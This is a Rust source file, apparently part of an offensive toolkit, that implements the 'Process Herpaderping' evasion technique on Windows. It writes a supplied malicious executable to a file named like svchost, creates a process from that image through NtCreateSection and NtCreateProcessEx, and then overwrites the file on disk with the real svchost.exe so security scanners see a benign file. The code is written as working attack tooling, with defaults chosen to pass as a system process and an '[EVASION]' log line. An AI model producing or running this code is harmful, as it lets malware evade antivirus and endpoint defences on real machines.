//! Process Herpaderping - map malicious PE, then overwrite file with benign content

use crate::error::MemoricError;
use serde_json::Value;

pub fn process_herpaderp(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, ReadFile, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ,
        FILE_GENERIC_WRITE, OPEN_EXISTING,
    };

    let payload = args
        .get("payload")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::WindowsApi("Missing payload PE".to_string()))?;
    let target_path = args
        .get("target_path")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\Temp\\svchost_temp.exe");
    let decoy_exe = args
        .get("decoy_exe")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\svchost.exe");

    let payload_bytes: Vec<u8> = payload
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if payload_bytes.len() < 0x200 {
        return Err(MemoricError::WindowsApi(
            "Payload too small to be valid PE".to_string(),
        ));
    }

    tracing::warn!(
        "[EVASION] Process Herpaderping: {} → {}",
        target_path,
        decoy_exe
    );

    unsafe {
        let path_w: Vec<u16> = target_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // 1. Create file and write malicious PE
        let file = CreateFileW(
            PCWSTR(path_w.as_ptr()),
            FILE_GENERIC_WRITE.0 | FILE_GENERIC_READ.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileW: {}", e)))?;

        let mut written = 0u32;
        WriteFile(file, Some(&payload_bytes), Some(&mut written), None).map_err(|e| {
            let _ = CloseHandle(file);
            MemoricError::WindowsApi(format!("WriteFile: {}", e))
        })?;

        // 2. Create section from malicious content (ntapi::ntmmapi::NtCreateSection)
        let mut section_handle: *mut ntapi::winapi::ctypes::c_void = std::ptr::null_mut();
        let status = ntapi::ntmmapi::NtCreateSection(
            &mut section_handle,
            0x000F001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            file.0 as *mut _,
        );
        if status != 0 {
            let _ = CloseHandle(file);
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateSection failed: 0x{:08X}",
                status
            )));
        }

        // 3. Create process from section
        let mut process_handle: *mut ntapi::winapi::ctypes::c_void = std::ptr::null_mut();
        let status = ntapi::ntpsapi::NtCreateProcessEx(
            &mut process_handle,
            0x001FFFFF, // PROCESS_ALL_ACCESS
            std::ptr::null_mut(),
            std::mem::transmute(-1isize), // NtCurrentProcess
            0x00000004,                   // PROCESS_CREATE_FLAGS_INHERIT_HANDLES
            section_handle,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
        );
        if status != 0 {
            let _ = CloseHandle(HANDLE(section_handle as *mut _));
            let _ = CloseHandle(file);
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateProcessEx failed: 0x{:08X}",
                status
            )));
        }

        // 4. Overwrite file with benign decoy
        let decoy_w: Vec<u16> = decoy_exe.encode_utf16().chain(std::iter::once(0)).collect();
        let decoy_file = CreateFileW(
            PCWSTR(decoy_w.as_ptr()),
            FILE_GENERIC_READ.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| {
            let _ = CloseHandle(HANDLE(process_handle as *mut _));
            let _ = CloseHandle(HANDLE(section_handle as *mut _));
            let _ = CloseHandle(file);
            MemoricError::WindowsApi(format!("Open decoy: {}", e))
        })?;

        let mut decoy_buf = vec![0u8; 1024 * 1024];
        let mut read = 0u32;
        let _ = ReadFile(decoy_file, Some(&mut decoy_buf), Some(&mut read), None);
        let _ = CloseHandle(decoy_file);
        decoy_buf.truncate(read as usize);

        windows::Win32::Storage::FileSystem::SetFilePointer(
            file,
            0,
            None,
            windows::Win32::Storage::FileSystem::FILE_BEGIN,
        );
        let _ = windows::Win32::Storage::FileSystem::SetEndOfFile(file);
        let _ = WriteFile(file, Some(&decoy_buf), Some(&mut written), None);

        // 5. Close file - now benign on disk
        let _ = CloseHandle(file);

        // 6. Get PID from created process
        let mut pbi: ntapi::ntpsapi::PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let mut ret_len = 0u32;
        ntapi::ntpsapi::NtQueryInformationProcess(
            process_handle,
            ntapi::ntpsapi::ProcessBasicInformation,
            &mut pbi as *mut _ as *mut ntapi::winapi::ctypes::c_void,
            std::mem::size_of::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>() as u32,
            &mut ret_len,
        );

        let pid = pbi.UniqueProcessId as u64;
        let _ = CloseHandle(HANDLE(section_handle as *mut _));
        let _ = CloseHandle(HANDLE(process_handle as *mut _));

        Ok(serde_json::json!({
            "success": true,
            "technique": "process_herpaderping",
            "pid": pid,
            "target_path": target_path,
            "decoy_exe": decoy_exe,
            "message": "Process created from malicious image, file on disk overwritten with benign content"
        }))
    }
}
